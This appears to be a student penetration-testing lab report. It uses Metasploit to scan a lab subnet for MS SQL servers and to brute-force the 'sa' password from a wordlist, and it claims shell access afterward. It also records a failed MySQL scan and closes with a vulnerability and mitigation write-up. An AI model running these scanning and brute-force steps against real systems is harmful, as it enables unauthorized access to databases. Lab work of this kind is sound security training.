# Documentation

## Lab 01: Attacking MS SQL Database

In this lab, we use Metasploit to target a MS SQL Database on our system using
`mssql_ping` and `MSSQL_Login`.

### MSSQL Ping

```
msf > use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > set RHOSTS 192.168.2.0/24
RHOSTS => 192.168.2.0/24
msf auxiliary(mssql_ping) > set THREADS 8
THREADS => 8
msf auxiliary(mssql_ping) > run
[...]
[*] SQL Server Information for 192.168.2.82:
[+]    ServerName   = WIN-9M1V7QKJ2TF
[+]    ServerName   = WINDOWSSRVR2008
[+]    InstanceName = SQLEXPRESS
[+]    IsClustered  = No
[+]    Version      = 10.0.2531.0
[+]    tcp          = 49174
[+]    np           = \\WINDOWSSRVR2008\pipe\MSSQL$SQLEXPRESS\sql\query
[+]    InstanceName = SQLEXPRESS
[+]    IsClustered  = No
[+]    via          = WINDOWSSRVR2008,1433
[+]    Version      = 10.40.4000.0
[+]    tcp          = 1433
[...]
```

### MSSQL Login

```
msf > use auxiliary/scanner/mssql/mssql_login
msf auxiliary(mssql_login) > set PASS_FILE /root/password.txt
PASS_FILE => /root/password.txt
msf auxiliary(mssql_login) > set RHOSTS 192.168.2.82
RHOSTS => 192.168.2.82
msf auxiliary(mssql_login) > set THREADS 8
THREADS => 8
msf auxiliary(mssql_login) > set verbose false
verbose => false
msf auxiliary(mssql_login) > run
[...]
[+] 192.168.2.82:1422 - LOGIN SUCCESSFUL: WORKSTATION\sa:P@ssw0rd1234
[...]
```

We've now obtained the username and password for the mssql database on the
target. We run the `exploit` command followed by the `shell` command and then we
have full access to the system.

## Lab 02: Attacking MYSQL Database

We begin this exercise by scanning for MYSQL on all systems using the
`mysql_version` module

### MYSQL Version Scan

```
msf > use auxiliary/scanner/mysql/mysql_version
msf auxiliary(mysql_version) > set RHOSTS 192.168.2.83
RHOSTS => 192.168.2.83
msf auxiliary(mysql_version) > run

[*] 192.168.2.83:3306 is running MySQL, but responds with an error: \x04Host '192.168.2.86' is
not allowed to connect to this MySQL server
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

It appears as though the vulnerability we were attempting to exploit has been
fixed. So, because of this, I'm unable to complete this portion of the lab.

# Vulnerabilities

## Vulnerability 01

Use of outdated and vulnerable MSSQL software.

### Description

The target machine is running an outdated version of MSSQL which has a
vulnerability that allows attackers to gain priviledged access to the system
using known exploit modules.

### Risk

**Impact:** 1

**Probability:** 0.9

**Magnitude:** 90%

### Mitigation

The mitigation for this vulnerability is to simply update your MSSQL software to
a version that patches this vulnerability and keep it updated.

